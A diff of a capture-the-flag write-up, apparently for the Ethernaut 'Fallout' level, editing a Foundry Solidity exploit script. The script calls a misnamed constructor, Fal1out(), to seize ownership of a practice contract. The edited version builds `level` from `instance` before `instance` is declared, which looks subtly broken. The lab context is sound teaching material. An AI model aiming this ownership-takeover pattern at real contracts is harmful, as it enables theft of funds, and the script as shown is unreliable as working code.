@@ -198,16 +198,16 @@ Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
 
 ```solidity
 contract Exploit is Script {
-    
+
+      Fallout level = Fallout(payable(address(instance)));
       address instance = vm.envAddress("INSTANCE_LEVEL2");
-      Fallout level = Fallout(payable(address(level_instance)));
+      uint256 hacker = vm.envUint("PRIVATE_KEY");    
+      address deployer = vm.rememberKey(hacker);
+      
+      function run() external {
 
-      function run() public {
-
-          vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-
+          vm.startBroadcast(deployer);
           level.Fal1out();
-
           vm.stopBroadcast();
     }
 }
